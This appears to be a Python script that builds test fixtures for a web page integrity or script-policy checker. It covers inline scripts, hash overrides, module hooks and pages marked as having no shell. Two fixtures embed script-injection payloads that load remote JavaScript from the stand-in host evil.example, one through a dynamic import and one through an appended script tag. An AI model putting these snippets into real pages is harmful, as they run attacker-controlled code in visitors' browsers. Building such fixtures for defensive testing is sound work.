import sys; sys.path.insert(0,'../adv4')
exec(open('../adv4/mk4.py').read().split('# noShell')[0])
DYN="import('https://evil.example/x.js');"
INJ="var s=document.createElement('script');s.src='https://evil.example/x.js';document.head.appendChild(s);"
FBMOD="import {initializeApp} from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';initializeApp({});"
TDI="import './ext/room.js';"
mk('b1_noshell_inline_dynimport',PIN,{'noShell':['terms.html'],'overrides':{'inline':[{'page':'terms.html','sha256':sha(DYN),'reason':'t'}]}},None,{'terms.html':'<html><script>'+DYN+'</script></html>'})
mk('b2_noshell_inline_injects_declared',PIN,{'noShell':['terms.html'],'overrides':{'inline':[{'page':'terms.html','sha256':sha(INJ),'reason':'t','injects':'loader'}]}},None,{'terms.html':'<html><script>'+INJ+'</script></html>'})
mk('b3_noshell_inline_fbmodule',PIN,{'noShell':['terms.html'],'overrides':{'inline':[{'page':'terms.html','sha256':sha(FBMOD),'reason':'t','imports':['https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js']}]}},None,{'terms.html':'<html><script type="module">'+FBMOD+'</script></html>'})
mk('b4_keep_imports_module',PIN,{'noShell':['terms.html'],'keep':[keep('takedown.js',TDI)],'overrides':{'modules':[{'file':'ext/room.js','sha256':sha(WRITER),'hooks':['__subxPlugins'],'load':'before','reason':'t'}]}},{'takedown.js':TDI,'ext/room.js':WRITER},{'terms.html':'<html><script type="module" src="takedown.js"></script></html>'})
mk('b5_handler_only_unlisted',PIN,{'overrides':{'inline':[{'page':'about.html','sha256':sha(WRITER),'reason':'t'}]}},None,{'about.html':'<html><body onload="'+WRITER.replace("'","&#39;")+'"></body></html>'})
mk('b6_noshell_runs_shell',PIN,{'noShell':['terms.html']},None,{'terms.html':'<html>'+PIN+'</html>'})
